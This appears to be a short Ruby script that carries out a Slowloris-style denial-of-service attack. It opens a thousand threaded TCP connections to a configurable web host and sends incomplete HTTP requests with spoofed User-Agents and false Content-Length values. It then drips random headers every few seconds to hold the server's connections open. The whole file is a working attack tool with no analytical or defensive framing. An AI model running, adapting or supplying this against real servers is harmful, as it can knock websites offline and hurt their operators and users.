require 'socket'
require 'thread/pool'

HOST = 'localhost' # mydomain.com
PORT = 80

raise 'Specify host' if HOST.empty?

agents = File.readlines('agents.txt')
pool = Thread.pool(2000)

1000.times do
  pool.process {
    socket = TCPSocket.new HOST, PORT
    headers = "GET / HTTP/1.1\r\nHost: #{HOST}\r\nUser-Agent: #{agents.sample.strip}\r\nContent-Length: #{rand(50..150)}\r\n"
    socket.write headers
    10.times do
      new_h = "X-a-#{rand(0..1000)}: b\r\n"
      socket.write new_h
      puts "wrote #{new_h}"
      sleep rand(2..5)
    end
  }
end

while true do true end
